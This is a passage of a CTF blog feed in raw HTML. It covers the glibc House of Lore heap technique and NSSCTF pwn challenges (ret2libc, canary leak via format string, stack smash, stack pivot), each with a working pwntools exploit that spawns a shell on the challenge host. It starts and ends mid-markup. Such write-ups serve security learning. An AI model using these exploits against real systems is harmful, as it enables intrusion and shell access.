class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>{ <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); }</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating dummy chunks for using up tcache later\n"</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake free-list on the stack\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) {</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  }</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake free-list at %p\n"</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "</span></span><br><span class="line">          <span class="string">"introduced by smallbin-to-tcache mechanism\n"</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing dummy chunk\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now take all dummies chunk in tcache out\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(0x100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li><strong>Small Bin Corruption Check (small bin 受损检查)</strong>:</li></ol><ul><li><code>glibc</code> 内存分配器在管理 small bin 时，会检查堆块的 <code>fwd</code> 和 <code>bk</code> 指针，以确保它们指向正确的位置。这是为了防止堆块链表被破坏，从而导致潜在的内存损坏或安全漏洞。</li><li>当内存分配器从 small bin 中分配或释放内存块时，它会检查每个堆块的 <code>fwd</code>（前向）和 <code>bk</code>（后向）指针。这些指针用于维护堆块链表，确保堆块能够正确插入和移除。</li><li>如果链表中存在不一致（例如指针指向错误的内存位置），内存分配器会检测到并触发一个错误，防止恶意利用。</li></ul><ol start="2"><li><strong>Smallbin-to-Tcache Mechanism (small bin 转换为 tcache 机制)</strong>:</li></ol><ul><li><code>glibc</code> 引入了 tcache（thread cache）机制，以加速小块内存的分配和释放。tcache 通过维护每个线程的私有缓存，减少了全局锁争用。然而，small bin 和 tcache 之间的转换会进行额外的检查，以确保堆块链表的完整性和一致性。</li><li>当内存块从 small bin 转移到 tcache 时，内存分配器会进行检查，以确保转移过程中的堆块链表没有损坏。这包括检查 <code>fwd</code> 和 <code>bk</code> 指针的有效性，以及确保链表的完整性。</li><li>这些检查可以防止攻击者通过伪造堆块链表来操纵内存分配过程。</li></ul><p>首先申请一个smallbin的范围内的chunk-victim_chunk，再在栈上构造两个fake_chunk和一个freelist以绕过上面的保护机制<br><img src="/2024/07/15/heap-study/house_of_lore_1.png" style="zoom:80%;"><br>随后构造stack_buffer_1和stack_buffer_2的fd和bk指针<br><img src="/2024/07/15/heap-study/house_of_lore_2.png"><br>此时再malloc一个chunk以防止victim_chunk与top_chunk合并  </p><p>随后再malloc一个large_chunk触发malloc_consolidate然后glibc会将victim_chunk由unstoredbin放入smallbin中<br>再将victim_chunk的fd指针改为stack_buffer_1<br>此时malloc一次将会malloc到victim_chunk，再malloc一次就会malloc到stack_buffer_1。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_0714_wp</title>
      <link href="/2024/07/14/NSSCTF-0714-wp/"/>
      <url>/2024/07/14/NSSCTF-0714-wp/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF_0714_wp<span id="more"></span></p><h1 id="CISCN-2019华中-PWN1"><a href="#CISCN-2019华中-PWN1" class="headerlink" title="[CISCN 2019华中]PWN1"></a>[CISCN 2019华中]PWN1</h1><p>checksec<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn4_1.png"><br>64位，开启了NX</p><p>丢到ida里<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn4_2.png"><br>encrypt函数里有一个gets()函数，存在栈溢出，ret2libc</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>,<span class="number">27835</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn4')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Welcome to this Encryption machine\n'</span>, <span class="string">b'1'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'puts_addr: '</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Welcome to this Encryption machine\n'</span>, <span class="string">b'1'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="BJDCTF-2020-babyrop2"><a href="#BJDCTF-2020-babyrop2" class="headerlink" title="[BJDCTF 2020]babyrop2"></a>[BJDCTF 2020]babyrop2</h1><p>checksec<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_1.png"><br>64位，开启了canary和NX</p><p>丢进ida里<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_2.png"><br>此处利用格式化字符串获取canary<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_3.png"><br>此处存在栈溢出泄露出lic，ret2libc</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28020</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn5')</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b'%7$p'</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'0x'</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b'00'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">ret = <span class="number">0x00000000004005f9</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x20</span> - <span class="number">0x08</span>) + p64(canary) * <span class="number">2</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">io.recv()</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x20</span> - <span class="number">0x08</span>) + p64(canary) * <span class="number">2</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_4.png"><br>打通！</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf</title>
      <link href="/2024/07/10/nssctf/"/>
      <url>/2024/07/10/nssctf/</url>
      
        <content type="html"><![CDATA[<p>一些wp<span id="more"></span></p><h1 id="stacksmash"><a href="#stacksmash" class="headerlink" title="stacksmash"></a>stacksmash</h1><p>checksec<br><img src="/2024/07/10/nssctf/easyecho_1.png"><br>64位，保护全开</p><p>丢到ida里<br>发现sub_CF0函数把flag写到bss段上<br><img src="/2024/07/10/nssctf/easyecho_2.png"><br><img src="/2024/07/10/nssctf/easyecho_3.png"><br>看到存在明显的栈溢出，采用stacksmash，当输入backdoor时就调用CF0函数</p><p>动调一下，得到argv[0]的距离<br><img src="/2024/07/10/nssctf/easyecho_4.png" style="zoom: 67%;"><br>看到距离为0x198但是此处的距离不对，正确的是0x168(具体原因不清楚，可能由于网站给的附件的问题)</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28260</span>)</span><br><span class="line"><span class="comment">#io = process('./easyecho')</span></span><br><span class="line">elf = ELF(<span class="string">'./easyecho'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'a'</span> * <span class="number">0xf</span> + <span class="string">b'b'</span></span><br><span class="line">io.sendafter(<span class="string">b'Name:'</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b'b'</span>)</span><br><span class="line">addr_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr_base:'</span>, <span class="built_in">hex</span>(addr_base))</span><br><span class="line">bss_addr = addr_base + <span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'backdoor\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'a'</span> * <span class="number">0x168</span> + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, payload2)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'exitexit'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>checksec<br><img src="/2024/07/10/nssctf/PWN2_1.png"><br>32位，开启了NX</p><p>丢到ida里<br><img src="/2024/07/10/nssctf/PWN2_2.png"><br>可以看到只有两个字长的溢出<br><img src="/2024/07/10/nssctf/PWN2_3.png"><br>还有一个假的后门函数</p><p>利用栈迁移，动调可得main_ebp距vul_ebp 0x10<br><img src="/2024/07/10/nssctf/PWN2_4.png"></p><p><img src="/2024/07/10/nssctf/PWN2_5.png">  </p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote('node5.anna.nssctf.cn', 27593)</span></span><br><span class="line">io = process(<span class="string">'./PWN2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PWN2'</span>)</span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x08048559</span></span><br><span class="line">leave = <span class="number">0x08048562</span></span><br><span class="line">ret = <span class="number">0x080483a6</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b'a'</span> * <span class="number">0x28</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'a'</span> * <span class="number">0x28</span>)</span><br><span class="line">pre_edp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'pre_edp: '</span> + <span class="built_in">hex</span>(pre_edp))</span><br><span class="line">target = pre_edp - <span class="number">0x28</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">4</span>) + p32(ret) + p32(call_system) + p32(target + <span class="number">0x10</span>) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b'a'</span>) + p32(target) + p32(leave)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="pthread-create多线程竞争"><a href="#pthread-create多线程竞争" class="headerlink" title="pthread_create多线程竞争"></a>pthread_create多线程竞争</h1><p>checksec<br><img src="/2024/07/10/nssctf/pthread_create_1.png"> </p><p>丢到ida里<br><img src="/2024/07/10/nssctf/pthread_create_2.png"> </p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span 